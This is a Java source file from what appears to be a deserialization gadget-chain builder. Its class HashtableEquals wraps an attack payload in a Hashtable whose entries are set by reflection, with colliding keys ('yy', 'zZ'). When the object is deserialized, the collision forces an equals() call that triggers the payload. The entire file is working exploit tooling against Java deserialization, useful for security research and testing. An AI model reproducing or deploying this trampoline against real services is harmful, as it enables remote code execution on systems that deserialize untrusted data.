package org.ses.gadgetbuilder.impl.trampolines.equals;

import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.chains.trampolines.singleparam.EqualsTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.util.Hashtable;

@Authors(Authors.BofeiC)
public class HashtableEquals implements EqualsTrampoline {
    @Override
    public Object wrapPayload(Object payload, Object param) throws Exception {
        Object hTbl = new Hashtable<>();

        Hashtable map1 = new Hashtable(); // Hashtable
        Hashtable map2 = new Hashtable();
        map1.put("yy",param);
        map1.put("zZ",payload);
        map2.put("yy",payload);
        map2.put("zZ",param);

        // Hashtable.Entry

        Object entry1 = Reflections.createWithoutConstructor(Class.forName("java.util.Hashtable$Entry"));
        Reflections.setFieldValue(entry1, "key", map1);
        Reflections.setFieldValue(entry1, "value", "1");

        Object entry2 = Reflections.createWithoutConstructor(Class.forName("java.util.Hashtable$Entry"));
        Reflections.setFieldValue(entry2, "key", map2);
        Reflections.setFieldValue(entry2, "value", "1");

        Object tbl = Array.newInstance(Class.forName("java.util.Hashtable$Entry"), 2);
        Array.set(tbl, 0, entry1);
        Array.set(tbl, 1, entry2);

        Reflections.setFieldValue(hTbl, "table", tbl);
        Reflections.setFieldValue(hTbl, "count", 2);

        return hTbl;
    }
}
